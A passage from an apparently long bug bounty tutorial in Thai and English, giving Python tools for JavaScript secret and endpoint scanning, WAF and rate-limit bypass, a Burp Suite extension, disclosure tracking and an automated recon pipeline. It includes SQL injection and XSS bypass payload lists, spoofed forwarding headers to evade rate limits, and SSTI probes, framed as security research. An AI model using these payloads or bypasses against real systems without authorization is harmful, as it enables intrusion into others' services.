        """Track bug report"""
        report = {
            'id': report_id,
            'program': program,
            'title': title,
            'severity': severity,
            'status': status,
            'submitted_at': datetime.now().isoformat(),
            'bounty': None,
            'duplicate': False
        }
        self.reports.append(report)
        return report
    
    def update_report_status(self, report_id: str, 
                              new_status: str, bounty: float = None):
        """Update report status"""
        for report in self.reports:
            if report['id'] == report_id:
                report['status'] = new_status
                if bounty:
                    report['bounty'] = bounty
                    self.earnings.append({
                        'report_id': report_id,
                        'amount': bounty,
                        'date': datetime.now().isoformat()
                    })
    
    def get_statistics(self) -> Dict:
        """Get hunting statistics"""
        total_reports = len(self.reports)
        resolved = [r for r in self.reports if r['status'] in ('resolved', 'bounty_awarded')]
        duplicates = [r for r in self.reports if r.get('duplicate', False)]
        
        total_earned = sum(e['amount'] for e in self.earnings)
        severity_breakdown = {}
        for r in self.reports:
            sev = r.get('severity', 'unknown')
            severity_breakdown[sev] = severity_breakdown.get(sev, 0) + 1
        
        return {
            'total_reports': total_reports,
            'resolved': len(resolved),
            'duplicates': len(duplicates),
            'resolution_rate': len(resolved) / total_reports * 100 if total_reports else 0,
            'total_earned': total_earned,
            'average_bounty': total_earned / len(self.earnings) if self.earnings else 0,
            'severity_breakdown': severity_breakdown
        }
```

## Step 686: JavaScript Analysis for Bug Hunting

```python
import re
import requests
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Set
from urllib.parse import urljoin, urlparse
import json


class JavaScriptAnalyzer:
    """วิเคราะห์ JavaScript เพื่อหา vulnerabilities และ secrets"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64)'
        })
    
    def extract_endpoints_from_js(self, js_content: str, base_url: str = '') -> List[str]:
        """ดึง endpoints จาก JavaScript"""
        endpoints = set()
        
        # รูปแบบ API endpoints
        patterns = [
            # Relative paths
            r'["\'](\/[a-zA-Z0-9_\-\/]+(?:\?[^"\')]*)?)["\']',
            # fetch/axios calls
            r'(?:fetch|axios\.(?:get|post|put|delete|patch))\(["\']([^\'"]+)["\']',
            # API base URL patterns
            r'(?:apiUrl|baseUrl|API_URL|BASE_URL)\s*[=:]\s*["\']([^\'"]+)["\']',
            # URL construction
            r'["\'](\/api\/[a-zA-Z0-9_\-\/]+)["\']',
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, js_content)
            for match in matches:
                if match.startswith('/'):
                    if base_url:
                        endpoints.add(urljoin(base_url, match))
                    else:
                        endpoints.add(match)
                elif match.startswith('http'):
                    endpoints.add(match)
        
        return list(endpoints)
    
    def find_secrets_in_js(self, js_content: str, source_url: str = '') -> List[Dict]:
        """หา secrets ใน JavaScript code"""
        secrets = []
        
        secret_patterns = [
            {
                'name': 'AWS Access Key',
                'pattern': r'AKIA[0-9A-Z]{16}',
                'severity': 'critical'
            },
            {
                'name': 'Google API Key',
                'pattern': r'AIza[0-9A-Za-z-_]{35}',
                'severity': 'high'
            },
            {
                'name': 'GitHub Token',
                'pattern': r'gh[pousr]_[A-Za-z0-9_]{36,255}',
                'severity': 'critical'
            },
            {
                'name': 'Stripe Secret Key',
                'pattern': r'sk_live_[0-9a-zA-Z]{24}',
                'severity': 'critical'
            },
            {
                'name': 'Stripe Publishable Key',
                'pattern': r'pk_live_[0-9a-zA-Z]{24}',
                'severity': 'medium'
            },
            {
                'name': 'Slack Token',
                'pattern': r'xox[baprs]-[0-9a-zA-Z-]+',
                'severity': 'high'
            },
            {
                'name': 'JWT Token',
                'pattern': r'eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*',
                'severity': 'medium'
            },
            {
                'name': 'Firebase URL',
                'pattern': r'https://[a-z0-9-]+\.firebaseio\.com',
                'severity': 'medium'
            },
            {
                'name': 'Hardcoded Password',
                'pattern': r'(?i)(?:password|passwd|pwd)\s*[=:]\s*["\']([^\'"]{8,})["\']',
                'severity': 'high'
            },
            {
                'name': 'Private Key',
                'pattern': r'-----BEGIN (RSA |EC )?PRIVATE KEY-----',
                'severity': 'critical'
            }
        ]
        
        for secret_def in secret_patterns:
            matches = re.finditer(secret_def['pattern'], js_content)
            for match in matches:
                # หา line number
                line_num = js_content[:match.start()].count('\n') + 1
                
                secrets.append({
                    'type': secret_def['name'],
                    'severity': secret_def['severity'],
                    'match': match.group(0)[:50] + ('...' if len(match.group(0)) > 50 else ''),
                    'line': line_num,
                    'source': source_url
                })
        
        return secrets
    
    def find_dom_sinks(self, js_content: str) -> List[Dict]:
        """หา dangerous DOM sinks (potential XSS)"""
        sinks = []
        
        dangerous_sinks = [
            {'name': 'innerHTML', 'pattern': r'\.innerHTML\s*=\s*', 'severity': 'high'},
            {'name': 'outerHTML', 'pattern': r'\.outerHTML\s*=\s*', 'severity': 'high'},
            {'name': 'document.write', 'pattern': r'document\.write\s*\(', 'severity': 'high'},
            {'name': 'eval', 'pattern': r'\beval\s*\(', 'severity': 'critical'},
            {'name': 'setTimeout with string', 'pattern': r'setTimeout\s*\(["\']', 'severity': 'high'},
            {'name': 'setInterval with string', 'pattern': r'setInterval\s*\(["\']', 'severity': 'high'},
            {'name': 'location.href from user input', 'pattern': r'location\.href\s*=.*(?:location|param|query|input)', 'severity': 'medium'},
            {'name': 'src from variable', 'pattern': r'\.src\s*=\s*(?![\'"]/)', 'severity': 'medium'},
        ]
        
        for sink in dangerous_sinks:
            matches = re.finditer(sink['pattern'], js_content)
            for match in matches:
                line_num = js_content[:match.start()].count('\n') + 1
                context_start = max(0, match.start() - 50)
                context_end = min(len(js_content), match.end() + 50)
                
                sinks.append({
                    'sink': sink['name'],
                    'severity': sink['severity'],
                    'line': line_num,
                    'context': js_content[context_start:context_end]
                })
        
        return sinks
    
    def analyze_page_scripts(self, url: str) -> Dict:
        """วิเคราะห์ scripts ทั้งหมดในหน้า"""
        try:
            response = self.session.get(url, timeout=15)
            response.raise_for_status()
            
            from html.parser import HTMLParser
            
            # หา script tags และ script src
            script_srcs = re.findall(r'<script[^>]+src=["\']([^\'"]+)["\']', response.text)
            inline_scripts = re.findall(r'<script[^>]*>([^<]+)</script>', response.text)
            
            all_endpoints = []
            all_secrets = []
            all_sinks = []
            
            # วิเคราะห์ inline scripts
            for script in inline_scripts:
                all_endpoints.extend(self.extract_endpoints_from_js(script, url))
                all_secrets.extend(self.find_secrets_in_js(script, url + ' (inline)'))
                all_sinks.extend(self.find_dom_sinks(script))
            
            # Download and analyze external scripts
            for src in script_srcs[:10]:
                script_url = urljoin(url, src)
                try:
                    js_response = self.session.get(script_url, timeout=10)
                    if js_response.status_code == 200:
                        js_content = js_response.text
                        all_endpoints.extend(self.extract_endpoints_from_js(js_content, url))
                        all_secrets.extend(self.find_secrets_in_js(js_content, script_url))
                        all_sinks.extend(self.find_dom_sinks(js_content))
                except Exception:
                    pass
            
            return {
                'url': url,
                'scripts_found': len(script_srcs),
                'endpoints': list(set(all_endpoints)),
                'secrets': all_secrets,
                'dangerous_sinks': all_sinks,
                'high_priority': [
                    s for s in all_secrets if s['severity'] in ('critical', 'high')
                ]
            }
            
        except Exception as e:
            return {'error': str(e), 'url': url}
```

## Step 687: Rate Limiting and WAF Bypass

```python
import requests
import time
import random
import string
from dataclasses import dataclass
from typing import List, Dict, Optional
from itertools import cycle


class WAFBypassTechniques:
    """เทคนิคการผ่าน WAF และ rate limiting"""
    
    USER_AGENTS = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15',
        'Googlebot/2.1 (+http://www.google.com/bot.html)',
    ]
    
    def generate_bypassed_payloads(self, original_payload: str, 
                                    bypass_type: str) -> List[str]:
        """สร้าง WAF bypass payloads"""
        payloads = [original_payload]
        
        if bypass_type == 'sql':
            # SQL injection WAF bypass techniques
            sql_bypasses = [
                # Case manipulation
                original_payload.upper(),
                original_payload.lower(),
                # Comment insertion
                original_payload.replace(' ', '/**/'),
                original_payload.replace(' ', '/*!*/'),
                original_payload.replace(' ', '%20'),
                original_payload.replace(' ', '%09'),  # Tab
                original_payload.replace(' ', '%0a'),  # Newline
                # URL encoding
                original_payload.replace('=', '%3D').replace(' ', '+'),
                # Double URL encoding
                original_payload.replace('=', '%253D'),
                # MySQL specific
                original_payload.replace('SELECT', 'SEL/**/ECT'),
                original_payload.replace('UNION', 'UN/**/ION'),
                # Buffer overflow WAF rules
                'A' * 1000 + original_payload,
            ]
            payloads.extend(sql_bypasses)
        
        elif bypass_type == 'xss':
            # XSS WAF bypass techniques
            xss_bypasses = [
                # Event handlers
                '<img src=x onerror=alert(1)>',
                '<img src=x oNeRRoR=alert(1)>',
                '<svg onload=alert(1)>',
                '<body onload=alert(1)>',
                # JavaScript URI
                '<a href="javascript:alert(1)">',
                '<a href="jAvAsCrIpT:alert(1)">',
                # Encoding
                '<script>\\x61lert(1)</script>',
                '<script>\\u0061lert(1)</script>',
                # Template literals
                '${alert(1)}',
                # Angular template injection
                '{{constructor.constructor(\'alert(1)\')()}}',
                # Polyglot
                'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e',
            ]
            payloads.extend(xss_bypasses)
        
        return payloads
    
    def bypass_ip_rate_limit(self, session: requests.Session, 
                              target_url: str, 
                              payload: str,
                              ip_list: List[str] = None) -> List[requests.Response]:
        """ผ่าน IP-based rate limiting"""
        responses = []
        
        # Techniques for bypassing IP rate limits
        bypass_headers = [
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Forwarded-For': '10.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Remote-IP': '127.0.0.1'},
            {'X-Client-IP': '127.0.0.1'},
            {'True-Client-IP': '127.0.0.1'},
            {'CF-Connecting-IP': '127.0.0.1'},
            {'Fastly-Client-IP': '127.0.0.1'},
        ]
        
        for headers in bypass_headers:
            try:
                response = session.post(
                    target_url,
                    data=payload,
                    headers=headers,
                    timeout=10
                )
                responses.append(response)
                
                if response.status_code != 429:  # ไม่ถูก rate limited
                    return [response]  # Found working bypass
                    
            except Exception:
                pass
        
        return responses
    
    def detect_waf(self, url: str) -> Dict:
        """ตรวจสอปว่า WAF ใช้ WAF"""
        waf_indicators = {
            'Cloudflare': ['cf-ray', 'cloudflare', '__cfduid', 'cf-cache-status'],
            'AWS WAF': ['x-amzn-requestid', 'x-amz-apigw-id'],
            'ModSecurity': ['mod_security', 'modsecurity', 'NOYB'],
            'Akamai': ['akamai', 'akamaighost', 'x-check-cacheable'],
            'Imperva': ['x-iinfo', 'x-cdn', 'incap_ses', 'visid_incap'],
            'Sucuri': ['x-sucuri-id', 'x-sucuri-cache'],
            'F5 BIG-IP': ['bigipserver', 'x-wa-info', 'x-cnection'],
        }
        
        detected_wafs = []
        
        try:
            # Normal request
            normal_response = requests.get(url, timeout=10)
            
            # Test with attack payload
            attack_url = f"{url}?test=<script>alert(1)</script>"
            attack_response = requests.get(attack_url, timeout=10)
            
            # Check headers and response codes
            response_headers = {k.lower(): v.lower() 
                               for k, v in attack_response.headers.items()}
            response_body = attack_response.text.lower()
            
            for waf_name, indicators in waf_indicators.items():
                for indicator in indicators:
                    indicator_lower = indicator.lower()
                    if (indicator_lower in response_headers or
                        indicator_lower in response_body):
                        detected_wafs.append(waf_name)
                        break
            
            # Check response code
            waf_codes = [403, 406, 429, 503]
            blocked = attack_response.status_code in waf_codes
            
            return {
                'detected_wafs': list(set(detected_wafs)),
                'blocked': blocked,
                'status_code': attack_response.status_code,
                'normal_status': normal_response.status_code
            }
            
        except Exception as e:
            return {'error': str(e)}
```

## Step 688: Burp Suite Extension Development

```python
# Burp Suite Extension สำหรับ automated testing
# ใช้กับ Burp Suite Python API (Jython)

from burp import IBurpExtender, IScannerCheck, IExtensionHelpers
from burp import IScanIssue, IHttpRequestResponse
from java.io import PrintWriter
import re


class BurpExtender(IBurpExtender, IScannerCheck):
    """
    Custom Burp Suite extension สำหรับ bug bounty automation
    ติดตั้งโดย: Extensions > Add > Python
    """
    
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self._stdout = PrintWriter(callbacks.getStdout(), True)
        
        callbacks.setExtensionName('Bug Bounty Scanner')
        callbacks.registerScannerCheck(self)
        
        self._stdout.println('[*] Bug Bounty Scanner loaded!')
    
    def doPassiveScan(self, baseRequestResponse):
        """สแกนแบบ passive"""
        issues = []
        
        request = baseRequestResponse.getRequest()
        response = baseRequestResponse.getResponse()
        
        if response is None:
            return issues
        
        response_info = self._helpers.analyzeResponse(response)
        response_body = self._helpers.bytesToString(response)[response_info.getBodyOffset():]
        
        # ตรวจหา secrets ใน response
        secret_patterns = [
            (r'AKIA[0-9A-Z]{16}', 'AWS Access Key'),
            (r'["\']password["\']\s*:\s*["\'][^\'"]{8,}["\']', 'Exposed Password'),
            (r'eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]*', 'JWT Token'),
            (r'AIza[0-9A-Za-z-_]{35}', 'Google API Key'),
        ]
        
        for pattern, name in secret_patterns:
            if re.search(pattern, response_body):
                issues.append(self._create_issue(
                    baseRequestResponse,
                    f'Sensitive Data Exposed: {name}',
                    f'The response contains a {name} which may expose sensitive credentials.',
                    'High'
                ))
        
        # ตรวจสอบ security headers
        headers = response_info.getHeaders()
        missing_headers = []
        
        required_headers = [
            'Content-Security-Policy',
            'X-Frame-Options',
            'X-Content-Type-Options',
            'Strict-Transport-Security',
        ]
        
        headers_str = str(headers)
        for header in required_headers:
            if header.lower() not in headers_str.lower():
                missing_headers.append(header)
        
        if missing_headers:
            issues.append(self._create_issue(
                baseRequestResponse,
                'Missing Security Headers',
                f'Missing headers: {", ".join(missing_headers)}',
                'Information'
            ))
        
        return issues
    
    def doActiveScan(self, baseRequestResponse, insertionPoint):
        """สแกนแบบ active"""
        issues = []
        
        # Test SSTI (Server-Side Template Injection)
        ssti_payloads = [
            ('{{7*7}}', '49'),
            ('${7*7}', '49'),
            ('<%= 7*7 %>', '49'),
        ]
        
        for payload, expected in ssti_payloads:
            checkRequest = insertionPoint.buildRequest(
                self._helpers.stringToBytes(payload)
            )
            
            checkRequestResponse = self._callbacks.makeHttpRequest(
                baseRequestResponse.getHttpService(),
                checkRequest
            )
            
            response = checkRequestResponse.getResponse()
            if response:
                response_str = self._helpers.bytesToString(response)
                if expected in response_str:
                    issues.append(self._create_issue(
                        checkRequestResponse,
                        'Server-Side Template Injection (SSTI)',
                        f'Payload {payload} evaluated to {expected}',
                        'Critical'
                    ))
                    break
        
        return issues
    
    def _create_issue(self, requestResponse, name, detail, severity):
        """Create scan issue"""
        return CustomScanIssue(
            requestResponse.getHttpService(),
            self._helpers.analyzeRequest(requestResponse).getUrl(),
            [self._callbacks.applyMarkers(requestResponse, None, None)],
            name,
            detail,
            severity
        )
    
    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        """Consolidate duplicate issues"""
        if existingIssue.getIssueName() == newIssue.getIssueName():
            return -1  # Keep existing
        return 0
```

## Step 689: Disclosure and Responsible Reporting

```python
from dataclasses import dataclass, field
from typing import List, Dict, Optional
from datetime import datetime, timedelta
from enum import Enum


class DisclosureTimeline(Enum):
    INITIAL_REPORT = 'initial_report'
    TRIAGE = 'triage'
    ACKNOWLEDGED = 'acknowledged'
    REMEDIATION = 'remediation'
    VERIFIED_FIX = 'verified_fix'
    DISCLOSED = 'disclosed'
    BOUNTY_PAID = 'bounty_paid'


@dataclass
class DisclosureRecord:
    vulnerability_title: str
    program: str
    reporter: str
    initial_report_date: str
    severity: str
    status: str = DisclosureTimeline.INITIAL_REPORT.value
    timeline: List[Dict] = field(default_factory=list)
    bounty: Optional[float] = None
    cve_id: Optional[str] = None
    public_disclosure_date: Optional[str] = None


class ResponsibleDisclosureManager:
    """จัดการ responsible disclosure process"""
    
    # Standard disclosure timeline ตาม industry practice
    DISCLOSURE_DEADLINE_DAYS = {
        'critical': 7,
        'high': 30,
        'medium': 60,
        'low': 90
    }
    
    def __init__(self):
        self.records: List[DisclosureRecord] = []
    
    def create_disclosure_record(self, 
                                   title: str,
                                   program: str,
                                   severity: str,
                                   reporter: str) -> DisclosureRecord:
        """Create new disclosure record"""
        record = DisclosureRecord(
            vulnerability_title=title,
            program=program,
            reporter=reporter,
            initial_report_date=datetime.now().isoformat(),
            severity=severity,
            timeline=[{
                'date': datetime.now().isoformat(),
                'event': 'Initial report submitted',
                'status': DisclosureTimeline.INITIAL_REPORT.value
            }]
        )
        self.records.append(record)
        return record
    
    def update_status(self, record: DisclosureRecord, 
                       new_status: DisclosureTimeline,
                       notes: str = ''):
        """Update disclosure status"""
        record.status = new_status.value
        record.timeline.append({
            'date': datetime.now().isoformat(),
            'event': new_status.value.replace('_', ' ').title(),
            'notes': notes
        })
    
    def check_disclosure_deadline(self, record: DisclosureRecord) -> Dict:
        """ตรวจสอบ deadline สำหรับ disclosure"""
        initial_date = datetime.fromisoformat(record.initial_report_date)
        deadline_days = self.DISCLOSURE_DEADLINE_DAYS.get(record.severity, 90)
        deadline = initial_date + timedelta(days=deadline_days)
        
        days_remaining = (deadline - datetime.now()).days
        overdue = days_remaining < 0
        
        return {
            'deadline': deadline.isoformat(),
            'days_remaining': days_remaining,
            'overdue': overdue,
            'status': 'OVERDUE' if overdue else 'PENDING',
            'recommended_action': (
                'Issue public disclosure notice' if overdue
                else f'Vendor has {days_remaining} days remaining'
            )
        }
    
    def generate_disclosure_notice(self, record: DisclosureRecord) -> str:
        """สร้าง disclosure notice"""
        return f"""
# Vulnerability Disclosure Notice

**Title:** {record.vulnerability_title}  
**Reporter:** {record.reporter}  
**Program:** {record.program}  
**Severity:** {record.severity.upper()}  
**CVE:** {record.cve_id or 'Pending'}  

## Timeline

| Date | Event |
|------|-------|
{''.join(f"| {e['date'][:10]} | {e['event']} |" for e in record.timeline)}

## Disclosure Policy

This vulnerability was reported to {record.program} on {record.initial_report_date[:10]}.
As per our responsible disclosure policy, we are publishing this notice 
{f'after the vendor remediated the issue' if record.status == 'verified_fix' else 'after the standard disclosure deadline'}.

## Summary

*Technical details will be published {record.public_disclosure_date or '90 days after initial report'}*

## Credit

{record.reporter} - Discovered and reported this vulnerability through responsible disclosure.
"""
```

## Step 690: Bug Bounty Automation Workflow

```python
import subprocess
import json
import os
from pathlib import Path
from dataclasses import dataclass
from typing import List, Dict
from datetime import datetime


class BugBountyAutomation:
    """เครื่องมือ automation สำหรับ bug bounty hunting"""
    
    def __init__(self, target: str, output_dir: str = '/tmp/bugbounty'):
        self.target = target
        self.output_dir = Path(output_dir) / target.replace('.', '_')
        self.output_dir.mkdir(parents=True, exist_ok=True)
    
    def full_recon(self) -> Dict:
        """Run full reconnaissance"""
        results = {
            'target': self.target,
            'started_at': datetime.now().isoformat(),
            'phases': {}
        }
        
        # Phase 1: Subdomain Enumeration
        print("\n[Phase 1] Subdomain Enumeration")
        subs = self._run_subfinder()
        results['phases']['subdomains'] = {
            'count': len(subs),
            'tools': ['subfinder', 'amass', 'crt.sh', 'assetfinder']
        }
        
        # Phase 2: DNS Resolution
        print("\n[Phase 2] DNS Resolution")
        alive = self._run_httpx(subs)
        results['phases']['alive_hosts'] = {'count': len(alive)}
        
        # Phase 3: Port Scanning
        print("\n[Phase 3] Port Scanning")
        ports = self._run_naabu(alive[:50])  # Limit to prevent ban
        results['phases']['open_ports'] = {'total': sum(len(p) for p in ports.values())}
        
        # Phase 4: Vulnerability Scanning
        print("\n[Phase 4] Nuclei Scanning")
        vulns = self._run_nuclei(alive)
        results['phases']['vulnerabilities'] = {
            'total': len(vulns),
            'critical': len([v for v in vulns if v.get('severity') == 'critical']),
            'high': len([v for v in vulns if v.get('severity') == 'high']),
        }
        
        results['completed_at'] = datetime.now().isoformat()
        
        # Save results
        results_file = self.output_dir / 'recon_results.json'
        results_file.write_text(json.dumps(results, indent=2))
        
        print(f"\n[+] Results saved to {results_file}")
        return results
    
    def _run_subfinder(self) -> List[str]:
        """Run subfinder"""
        output_file = self.output_dir / 'subdomains.txt'
        
        result = subprocess.run(
            ['subfinder', '-d', self.target, '-o', str(output_file), '-silent'],
            capture_output=True, text=True, timeout=120
        )
        
        if output_file.exists():
            return [l.strip() for l in output_file.read_text().split('\n') if l.strip()]
        return []
    
    def _run_httpx(self, hosts: List[str]) -> List[str]:
        """Run httpx"""
        hosts_file = self.output_dir / 'hosts.txt'
        hosts_file.write_text('\n'.join(hosts))
        output_file = self.output_dir / 'alive.txt'
        
        subprocess.run(
            ['httpx', '-l', str(hosts_file), '-o', str(output_file),
             '-silent', '-status-code', '-no-color', '-timeout', '10'],
            capture_output=True, text=True, timeout=300
        )
        
        if output_file.exists():
            return [l.strip() for l in output_file.read_text().split('\n') if l.strip()]
        return []
    
    def _run_naabu(self, hosts: List[str]) -> Dict[str, List[int]]:
        """Run naabu port scanner"""
        hosts_file = self.output_dir / 'alive_hosts.txt'
        hosts_file.write_text('\n'.join(hosts))
        output_file = self.output_dir / 'ports.json'
        
        subprocess.run(
            ['naabu', '-l', str(hosts_file), '-top-ports', '1000',
             '-json', '-o', str(output_file), '-silent'],
            capture_output=True, text=True, timeout=300
        )
        
        ports = {}
        if output_file.exists():
            for line in output_file.read_text().split('\n'):
                if line:
                    try:
                        data = json.loads(line)
                        ip = data.get('ip', '')
                        port = data.get('port', 0)
                        if ip not in ports:
                            ports[ip] = []
                        ports[ip].append(port)
                    except json.JSONDecodeError:
                        pass
        
        return ports
    
    def _run_nuclei(self, urls: List[str]) -> List[Dict]:
        """Run Nuclei"""
        urls_file = self.output_dir / 'urls.txt'
        urls_file.write_text('\n'.join(urls))
        output_file = self.output_dir / 'nuclei_results.json'
        
        subprocess.run(
            ['nuclei', '-l', str(urls_file),
             '-t', 'cves', '-t', 'exposures', '-t', 'vulnerabilities',
             '-severity', 'critical,high,medium',
             '-json-export', str(output_file),
             '-silent', '-no-color', '-rate-limit', '100'],
            capture_output=True, text=True, timeout=600
        )
        
        findings = []
        if output_file.exists():
            for line in output_file.read_text().split('\n'):
                if line:
                    try:
                        data = json.loads(line)
                        info = data.get('info', {})
                        findings.append({
                            'template': data.get('template-id', ''),
                            'name': info.get('name', ''),
                            'severity': info.get('severity', 'unknown'),
                            'host': data.get('host', ''),
                            'matched': data.get('matched-at', '')
                        })
                    except json.JSONDecodeError:
                        pass
        
        return findings


if __name__ == '__main__':
    # Demo Bug Bounty automation
    target = Target(
        domain='example.com',
        scope=['*.example.com'],
        out_of_scope=['internal.example.com'],
        program='Example Bug Bounty',
        platform='hackerone'
    )
    
    # Recon
    recon = BugBountyRecon(target)
    subdomains = recon.enumerate_subdomains()
    print(f"Found {len(subdomains)} subdomains")
    
    # Vulnerability scanning
    scanner = VulnerabilityScanner('https://example.com')
    redirect_bugs = scanner.test_open_redirect(['https://example.com/redirect'])
    cors_bugs = scanner.test_cors_misconfiguration(['https://api.example.com/v1/user'])
    
    # Report generation
    reporter = BugReportGenerator()
    if redirect_bugs:
        report = reporter.generate_hackerone_report(redirect_bugs[0])
        print(report[:500])
    
    # JS Analysis
    js_analyzer = JavaScriptAnalyzer()
    js_results = js_analyzer.analyze_page_scripts('https://example.com')
    print(f"Found {len(js_results.get('endpoints', []))} endpoints in JS")
    print(f"Found {len(js_results.get('secrets', []))} potential secrets")
    
    # Bug Bounty tracking
    tracker = BugBountyTracker()
    report_record = tracker.track_report(
        'H-12345', 'Example Program',
        'Open Redirect in /redirect endpoint',
        'medium'
    )
    
    stats = tracker.get_statistics()
    print(f"Reports: {stats['total_reports']}, Earned: ${stats['total_earned']}")
    
    # Nuclei scanning
    nuclei = NucleiScanner()
    nuclei_results = nuclei.scan_target(
        'https://example.com',
        severity='critical,high'
    )
    print(f"Nuclei found {len(nuclei_results)} findings")
```
